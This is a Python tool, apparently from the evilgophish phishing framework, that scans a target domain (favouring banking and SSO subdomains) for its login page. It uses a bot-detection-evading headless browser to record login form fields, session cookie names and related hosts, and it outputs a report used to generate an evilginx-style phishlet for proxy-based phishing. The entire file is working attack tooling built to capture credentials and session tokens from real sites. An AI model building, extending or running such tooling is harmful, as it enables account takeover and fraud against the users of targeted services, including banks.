#!/usr/bin/env python3
"""phishlet_harvester.py

Standalone discovery + harvest CLI used by the evilgophish "New Phishlet"
panel feature (Option A bridge).

Flow:
  1. Static discovery: probe common login paths/subdomains of a domain.
  2. Pick the most login-looking candidate.
  3. Headless browser pass (Playwright/Chromium): confirm the login page,
     harvest the network trace (resource hostnames, Set-Cookie names) and
     the login form fields.
  4. Emit report.json consumed by internal/phishletgen.

Usage:
  python phishlet_harvester.py --domain example.com --out report.json [--timeout 150]

Exit codes: 0 success, 1 runtime/setup error, 2 no login page found.
"""

import argparse
import asyncio
import json
import os
import re
import sys
import urllib.parse
from typing import Dict, List, Optional, Set, Tuple

from bs4 import BeautifulSoup
import httpx
import tldextract
from playwright.async_api import async_playwright

# Paths probed before the browser pass.
COMMON_PATHS = [
    "/login", "/login.php", "/signin", "/sign-in", "/auth",
    "/user/login", "/account/login", "/admin", "/wp-login.php",
    "/portal", "/dashboard", "/session/new", "/i/flow/login",
]
COMMON_SUBDOMAINS = [
    "online", "ib", "ebanking", "digital", "login", "auth",
    "sso", "account", "accounts", "myaccount", "portal", "business",
]
AUTH_KEYWORDS = [
    "online banking", "internet banking", "e-banking", "digital banking",
    "log in", "login", "sign in", "signin", "auth", "portal",
]
LOGIN_TRIGGER_TEXTS = ["log in", "login", "sign in", "signin"]

# Registrable domains that are third-party/trackers and should never be
# proxied into the phishlet.
SKIP_HOST_RE = re.compile(
    r"\.?(google-analytics\.com|googletagmanager\.com|googleapis\.com|"
    r"gstatic\.com|doubleclick\.net|googlesyndication\.com|"
    r"facebook\.com|fbcdn\.net|hotjar\.com|cloudflareinsights\.com|"
    r"cdnjs\.cloudflare\.com|jsdelivr\.net|unpkg\.com|sentry\.io|"
    r"datadoghq\.com|newrelic\.com|amplitude\.com|mixpanel\.com|"
    r"segment\.io|optimizely\.com|chartbeat\.com|scorecardresearch\.com|"
    r"bluekai\.com|adnxs\.com|rubiconproject\.com|pubmatic\.com|"
    r"openx\.net|taboola\.com|outbrain\.com|quantserve\.com|"
    r"criteo\.com|krxd\.net|rlcdn\.com|zedo\.com|agkn\.com|"
    r"turn\.com|everesttech\.net|moatads\.com|tealium\.com|"
    r"luckyorange\.net|mouseflow\.com|fullstory\.com|crazyegg\.com)$"
)

STEALTH_INIT_SCRIPT = """
    Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
    window.navigator.chrome = { runtime: {} };
    Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3] });
    Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
    const originalAttachShadow = Element.prototype.attachShadow;
    Element.prototype.attachShadow = function(init) {
        init.mode = 'open';
        return originalAttachShadow.call(this, init);
    };
"""

UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
)

HEADERS = {
    "User-Agent": UA,
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
}

# JS that inspects the live DOM for the login form field names. Runs inside
# the page, so shadow DOM content is reachable (we force shadow roots open).
FIELD_SCAN_JS = """
    () => {
        const out = {has_password: false, username_key: null, password_key: null,
                     form_action: null, form_method: null};
        const pws = document.querySelectorAll('input[type="password"]');
        if (!pws.length) return out;
        out.has_password = true;
        const pw = pws[0];
        out.password_key = pw.name || 'password';
        const form = pw.closest('form');
        if (form) {
            out.form_action = form.getAttribute('action') || '';
            out.form_method = (form.getAttribute('method') || 'post').toLowerCase();
            const user = form.querySelector(
                'input[autocomplete="username"], input[type="email"], ' +
                'input[name*="user" i], input[name*="login" i], ' +
                'input[name*="email" i], input[name*="identifier" i]');
            if (user) out.username_key = user.name || 'username';
        }
        if (!out.username_key) {
            const cand = document.querySelector(
                'input[autocomplete="username"], input[type="email"], ' +
                'input[name*="user" i], input[name*="login" i], ' +
                'input[name*="email" i]');
            if (cand) out.username_key = cand.name || 'username';
        }
        if (!out.username_key) out.username_key = 'username';
        return out;
    }
"""

extractor = tldextract.TLDExtract(suffix_list_urls=None)


# ---------------------------------------------------------------------------
# report helpers
# ---------------------------------------------------------------------------

class Report:
    def __init__(self, domain: str, site: str):
        self.site = site
        self.domain = domain
        self.login_url: str = ""
        self.login_domain: str = ""
        self.login_path: str = "/"
        self.proxy_hosts: List[dict] = []
        self.auth_tokens: List[dict] = []
        self.credentials: Dict[str, dict] = {}
        self.notes: List[str] = []

    def to_dict(self) -> dict:
        return {
            "site": self.site,
            "domain": self.domain,
            "login_url": self.login_url,
            "login_domain": self.login_domain,
            "login_path": self.login_path,
            "proxy_hosts": self.proxy_hosts,
            "auth_tokens": self.auth_tokens,
            "credentials": self.credentials,
            "notes": self.notes,
        }


def registrable(host: str) -> str:
    ext = extractor(host)
    if ext.suffix and ext.domain:
        return f"{ext.domain}.{ext.suffix}"
    return host


def split_host(host: str) -> Tuple[str, str]:
    """Return (orig_sub, domain) for a host, evilginx-style.

    www.linkedin.com    -> ("www", "linkedin.com")
    githubassets.com    -> ("", "githubassets.com")
    online.ib.bank.com  -> ("online.ib", "bank.com")
    """
    host = host.lower().strip(".")
    ext = extractor(host)
    base = f"{ext.domain}.{ext.suffix}" if ext.suffix and ext.domain else host
    sub = ext.subdomain or ""
    return sub, base


def site_name(domain: str) -> str:
    ext = extractor(domain)
    base = f"{ext.domain}.{ext.suffix}" if ext.suffix and ext.domain else domain
    return re.sub(r"[^a-zA-Z0-9\-\.]", "-", base.lower())


def is_external_host(host: str) -> bool:
    host = host.lower().strip(".")
    return bool(SKIP_HOST_RE.search(host))


def host_from_url(url: str) -> str:
    try:
        return urllib.parse.urlparse(url).netloc.lower().strip(".")
    except Exception:
        return ""


def short_err(e: Exception) -> str:
    msg = str(e)
    return msg if len(msg) <= 200 else msg[:200] + "..."


# ---------------------------------------------------------------------------
# static discovery layer
# ---------------------------------------------------------------------------

class Discoverer:
    def __init__(self, raw_domain: str):
        self.raw = raw_domain.lower().strip().replace("https://", "").replace("http://", "").strip("/")
        self.base = registrable(self.raw)
        self.candidates: Set[str] = set()

    def _safe_get(self, url: str, timeout: float = 5.0) -> Optional[httpx.Response]:
        try:
            return httpx.get(url, headers=HEADERS, follow_redirects=True,
                             timeout=timeout, verify=False)
        except Exception:
            return None

    def _crt_subdomains(self, limit: int = 14) -> List[str]:
        """Pull historically-seen subdomains from certificate transparency
        logs. Auth-shaped names (login., auth., sso., account., ...) are
        preferred so the browser inspects those first."""
        try:
            resp = self._safe_get(f"https://crt.sh/?q=%25.{self.base}&output=json")
            if not resp or resp.status_code != 200:
                return []
            data = resp.json()
            if not isinstance(data, list):
                return []
        except Exception:
            return []
        subs: Set[str] = set()
        for entry in data:
            names = (entry.get("name_value") or "").splitlines()
            for nm in names:
                nm = nm.strip().lower().strip("*.")
                if not nm or not (nm == self.base or nm.endswith("." + self.base)):
                    continue
                subs.add(nm)

        def rank(name: str) -> int:
            return 1 if any(k in name for k in
                            ("login", "auth.", "sso", "account", "signin",
                             "portal", "online.", ".ib", "myaccount", "iap",
                             "id.")) else 0
        return sorted(subs, key=lambda n: (-rank(n), n))[:limit]

    def _oidc_endpoints(self) -> List[str]:
        """Discover the login URL via well-known OpenID Connect discovery.
        Only same-brand (same registrable domain) endpoints are kept so the
        harvester does not chase third-party identity providers."""
        out = []
        for host in (f"https://{self.raw}", f"https://www.{self.base}"):
            resp = self._safe_get(host + "/.well-known/openid-configuration")
            if not resp or resp.status_code != 200:
                continue
            try:
                data = resp.json()
            except Exception:
                continue
            if not isinstance(data, dict):
                continue
            for v in (data.get("authorization_endpoint"), data.get("issuer")):
                if not v or not str(v).startswith("http"):
                    continue
                ep_host = urllib.parse.urlparse(v).netloc.lower().strip(".")
                if ep_host == self.base or ep_host.endswith("." + self.base):
                    out.append(str(v))
        return out

    def discover(self) -> List[str]:
        for r in (f"https://www.{self.raw}", f"https://{self.raw}"):
            resp = self._safe_get(r)
            if resp and resp.status_code == 200:
                self.candidates.add(str(resp.url))
                if "text/html" in resp.headers.get("content-type", "").lower():
                    soup = BeautifulSoup(resp.text, "html.parser")
                    for tag in soup.find_all(["a", "form"]):
                        attr = tag.get("href") or tag.get("action")
                        if not attr:
                            continue
                        low = attr.lower()
                        text = tag.get_text(" ", strip=True).lower()
                        if any(k in low or k in text for k in AUTH_KEYWORDS):
                            full = urllib.parse.urljoin(str(resp.url), attr)
                            if full.startswith("http"):
                                self.candidates.add(full)
                break

        roots = []
        for h in (self.raw, "www." + self.base):
            if h not in roots:
                roots.append(h)
        for p in COMMON_PATHS:
            # Apex first; only fall back to www when the apex did not serve
            # the path - this avoids hanging on blocked/dead www hosts.
            for host in roots:
                resp = self._safe_get(f"https://{host}{p}")
                if resp and resp.status_code in (200, 401, 403):
                    self.candidates.add(str(resp.url))
                    break

        for sub in COMMON_SUBDOMAINS:
            resp = self._safe_get(f"https://{sub}.{self.base}")
            if resp and resp.status_code in (200, 401, 403):
                self.candidates.add(str(resp.url))

        for sub in self._crt_subdomains():
            resp = self._safe_get(f"https://{sub}")
            if resp and resp.status_code in (200, 401, 403):
                self.candidates.add(str(resp.url))

        for ep in self._oidc_endpoints():
            self.candidates.add(ep)

        return sorted(self.candidates)


def static_score(url: str) -> int:
    score = 0
    p = urllib.parse.urlparse(url)
    path = p.path.lower()
    if any(k in path for k in ["login", "signin", "sign-in", "session",
                               "auth", "wp-admin", "account", "user/login"]):
        score += 30
    if any(k in p.netloc for k in ["login.", "auth.", "sso.", "account.", "online.", "ib."]):
        score += 15
    if len([s for s in path.split("/") if s]) <= 1:
        score += 5
    return score


def static_has_login(url: str) -> bool:
    """Cheap pre-check: fetch the page statically and look for a password
    field. Mirrors the original auditor's static_dom verification so the
    expensive browser step starts with pages already known to be logins."""
    try:
        r = httpx.get(url, headers=HEADERS, follow_redirects=True,
                      timeout=6.0, verify=False)
        if r.status_code != 200:
            return False
        if "text/html" not in r.headers.get("content-type", "").lower():
            return False
        soup = BeautifulSoup(r.text, "html.parser")
        for inp in soup.find_all("input"):
            t = (inp.get("type") or "").lower()
            blob = ((inp.get("name") or "") + " " + (inp.get("id") or "")).lower()
            if t == "password" or "passw" in blob:
                return True
        return False
    except Exception:
        return False


# ---------------------------------------------------------------------------
# headless harvest layer
# ---------------------------------------------------------------------------

class Harvester:
    def __init__(self, report: Report):
        self.report = report
        self.hosts: Set[str] = set()
        self.cookie_names: Dict[str, Set[str]] = {}
        self._playwright = None
        self._browser = None
        self._context = None

    def add_host(self, netloc: str):
        if netloc and ":" not in netloc:
            self.hosts.add(netloc.lower().strip("."))

    def add_cookie(self, cookie_domain: str, name: str):
        cd = cookie_domain.lower().strip(".")
        if cd:
            self.cookie_names.setdefault("." + cd, set()).add(name)

    async def open(self):
        if self._browser is None:
            self._playwright = await async_playwright().start()
            self._browser = await self._playwright.chromium.launch(
                headless=True,
                args=[
                    "--disable-blink-features=AutomationControlled",
                    "--no-sandbox",
                    "--disable-dev-shm-usage",
                    "--disable-web-security",
                    "--window-size=1920,1080",
                ],
            )
            self._context = await self._browser.new_context(
                ignore_https_errors=True,
                viewport={"width": 1920, "height": 1080},
                user_agent=UA,
            )
            await self._context.add_init_script(STEALTH_INIT_SCRIPT)

    async def close(self):
        for closer in (self._context, self._browser, self._playwright):
            if closer is None:
                continue
            try:
                await closer.close()
            except Exception:
                pass
        self._context = self._browser = self._playwright = None

    async def harvest_url(self, url: str) -> bool:
        if self._browser is None:
            await self.open()
        page = await self._context.new_page()
        try:
            def on_request(req):
                try:
                    self.add_host(urllib.parse.urlparse(req.url).netloc)
                except Exception:
                    pass

            async def on_response(resp):
                try:
                    self.add_host(urllib.parse.urlparse(resp.url).netloc)
                    for h in await resp.headers_array():
                        if h.get("name", "").lower() == "set-cookie":
                            name = h.get("value", "").split("=", 1)[0].strip()
                            if name:
                                self.add_cookie(urllib.parse.urlparse(resp.url).netloc, name)
                except Exception:
                    pass

            page.on("request", on_request)
            page.on("response", on_response)

            try:
                await page.goto(url, wait_until="domcontentloaded", timeout=15000)
            except Exception:
                try:
                    await page.goto(url, wait_until="commit", timeout=10000)
                except Exception:
                    return False

            await self._wait_meaningful(page)
            fields = await self._scan(page)
            if not fields["has_password"]:
                fields = await self._try_reveal(page, fields)
                if not fields["has_password"]:
                    return False

            self.report.login_url = page.url
            self.report.credentials = {
                "username": {"key": fields["username_key"]},
                "password": {"key": fields["password_key"]},
            }
            if fields["form_method"] and fields["form_method"] not in ("post",):
                self.report.notes.append(
                    "login form method is '%s' - verify it is a POST form before use"
                    % fields["form_method"]
                )
            if not fields["form_action"]:
                self.report.notes.append(
                    "login form found but no POST action captured; password may be "
                    "submitted via XHR/JSON - credentials type may need 'json'"
                )
            return True
        except Exception as e:
            self.report.notes.append("harvest error: %s" % short_err(e))
            return False
        finally:
            try:
                await page.close()
            except Exception:
                pass

    async def _wait_meaningful(self, page, timeout: int = 8000):
        try:
            await page.wait_for_selector(
                '*[type="password"], form, *[autocomplete="username"]',
                timeout=timeout, state="attached",
            )
            return
        except Exception:
            pass
        try:
            await page.wait_for_load_state("networkidle", timeout=timeout)
        except Exception:
            pass

    async def _scan(self, page) -> dict:
        for target in (page,):
            try:
                return await target.evaluate(FIELD_SCAN_JS)
            except Exception:
                continue
        return {"has_password": False, "username_key": None, "password_key": None,
                "form_action": None, "form_method": None}

    async def _try_reveal(self, page, fields: dict) -> dict:
        # Race: the fields dict may come out of _scan; if no password field
        # yet, click a login trigger and rescan.
        for text in LOGIN_TRIGGER_TEXTS:
            trigger = page.locator('button:has-text("%s"), a:has-text("%s")' % (text, text)).first
            try:
                if not (await trigger.count() and await trigger.is_visible()):
                    continue
                try:
                    async with page.expect_navigation(timeout=4000):
                        await trigger.click(timeout=3000)
                except Exception:
                    await trigger.click(timeout=3000)
                await self._wait_meaningful(page, timeout=6000)
                await page.wait_for_timeout(800)
                new = await self._scan(page)
                if new["has_password"]:
                    return new
            except Exception:
                continue
        return fields


# ---------------------------------------------------------------------------
# report assembly
# ---------------------------------------------------------------------------

def build_proxy_hosts(h: Harvester, report: Report) -> List[dict]:
    target_base = registrable(report.domain)
    brand_word = re.sub(r"\.(com|net|org|io|co|info|biz|me|us|de|fr|uk|ca|au|nl|es|it|ru|br|mx|in|[a-z]{2})$", "", target_base)
    landing_login_host = host_from_url(report.login_url)

    entries: Dict[str, dict] = {}
    for host in sorted(h.hosts):
        if is_external_host(host):
            continue
        if registrable(host) != target_base and brand_word not in registrable(host):
            continue
        orig_sub, domain = split_host(host)
        if not domain:
            continue
        key = "%s|%s" % (orig_sub, domain)
        entries.setdefault(key, {"orig_sub": orig_sub, "domain": domain,
                                 "session": False, "is_landing": False})

    ret = list(entries.values())
    if not ret:
        orig_sub, domain = split_host(landing_login_host or report.domain)
        ret = [{"orig_sub": orig_sub, "domain": domain,
                "session": True, "is_landing": True}]
        report.notes.append(
            "no same-brand resource hosts observed; phishlet uses only the login host - "
            "review proxy_hosts before use"
        )

    for e in ret:
        host = (e["orig_sub"] + "." if e["orig_sub"] else "") + e["domain"]
        if host == landing_login_host:
            e["is_landing"] = True
            e["session"] = True

    if not any(e["is_landing"] for e in ret):
        ret[0]["is_landing"] = True
    if not any(e["session"] for e in ret):
        ret[0]["session"] = True
    return ret


def build_auth_tokens(h: Harvester) -> List[dict]:
    out = []
    for cd in sorted(h.cookie_names):
        names = sorted(h.cookie_names[cd])
        if names:
            out.append({"domain": cd, "keys": names})
    return out


# ---------------------------------------------------------------------------
# main
# ---------------------------------------------------------------------------

async def run(domain: str, out_path: str, timeout: int) -> int:
    del timeout  # overall wait_for is applied by main()
    raw = domain.lower().strip().replace("https://", "").replace("http://", "").strip("/")
    if not raw:
        print("[!] empty domain", file=sys.stderr)
        return 1

    report = Report(raw, site_name(raw))
    d = Discoverer(raw)
    print("[*] discovering login candidates for %s ..." % raw, file=sys.stderr)
    candidates = d.discover()
    if not candidates:
        candidates = [f"https://www.{raw}", f"https://{raw}"]

    scored = sorted(candidates, key=static_score, reverse=True)
    # Static-DOM pre-confirmation (cheap): pages already known to contain a
    # password field go first so the browser starts with the real login.
    pre = []
    for c in scored[:6]:
        if static_has_login(c):
            pre.append(c)
            print("    [static] login form seen at %s" % c, file=sys.stderr)
    ordered = pre + [c for c in scored if c not in pre]
    targets = []
    for c in ordered:
        if c not in targets:
            targets.append(c)
        if len(targets) >= 4:
            break
    print("[*] browser inspection targets: %s" % targets, file=sys.stderr)

    h = Harvester(report)
    confirmed = False
    for u in targets:
        print("    -> %s" % u, file=sys.stderr)
        if await h.harvest_url(u):
            confirmed = True
            print("    [+] login form confirmed at %s" % report.login_url, file=sys.stderr)
            break

    if not confirmed:
        print("[!] no login form found after browser inspection", file=sys.stderr)
        return 2

    parsed = urllib.parse.urlparse(report.login_url)
    report.login_domain = parsed.netloc.lower().strip(".")
    report.login_path = parsed.path or "/"
    if not report.login_path.startswith("/"):
        report.login_path = "/" + report.login_path

    login_base = registrable(report.login_domain)
    if login_base and login_base != registrable(report.domain):
        report.notes.append(
            "login page lives on '%s' - a different registrable domain than the "
            "submitted domain. Re-run with domain '%s' to get a properly filtered phishlet."
            % (report.login_domain, login_base)
        )

    report.proxy_hosts = build_proxy_hosts(h, report)
    report.auth_tokens = build_auth_tokens(h)

    for t in report.auth_tokens:
        print("    cookies @ %s: %s" % (t["domain"], ", ".join(t["keys"][:6])), file=sys.stderr)
    print("    proxy hosts: %d" % len(report.proxy_hosts), file=sys.stderr)

    out_abs = os.path.abspath(out_path)
    os.makedirs(os.path.dirname(out_abs) or ".", exist_ok=True)
    with open(out_abs, "w", encoding="utf-8") as f:
        json.dump(report.to_dict(), f, indent=2)
    print("[*] report written to %s" % out_abs, file=sys.stderr)
    return 0


def main():
    ap = argparse.ArgumentParser(description="evilgophish phishlet harvester")
    ap.add_argument("--domain", required=True)
    ap.add_argument("--out", required=True)
    ap.add_argument("--timeout", type=int, default=150)
    args = ap.parse_args()

    if sys.platform.startswith("win"):
        asyncio.set_event_loop_policy(asyncio.WindowsProactorEventLoopPolicy())

    async def entry():
        return await asyncio.wait_for(run(args.domain, args.out, args.timeout),
                                      timeout=args.timeout)

    try:
        code = asyncio.run(entry())
    except asyncio.TimeoutError:
        print("[!] timeout", file=sys.stderr)
        code = 1
    except Exception as e:
        print("[!] error: %s" % short_err(e), file=sys.stderr)
        code = 1
    sys.exit(code)


if __name__ == "__main__":
    main()